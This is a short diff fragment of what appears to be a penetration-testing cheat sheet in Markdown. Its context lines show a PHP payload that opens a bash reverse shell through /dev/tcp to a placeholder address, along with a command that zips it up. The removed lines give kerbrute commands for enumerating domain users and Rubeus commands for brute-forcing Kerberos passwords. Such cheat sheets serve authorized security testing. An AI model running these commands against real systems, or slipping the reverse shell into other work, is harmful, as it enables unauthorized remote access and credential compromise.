@@ -246,16 +246,6 @@ exec("/bin/bash -c 'bash -i >& /dev/tcp/<ip>/<port> 0>&1'") ?>
 zip -r rs.zip rs
 ```
 
-### Kerberos - 88
-
-```shell
-# enum users
-kerbrute enumusers --dc <ip> -d <domain> <userlist>
-
-# windows
-.\Rubeus.exe brute /users:<userlist> /passwords:<wordlist> /domain:<domain>
-```
-
 ### NFS - 111, 2049
 
 ```shell
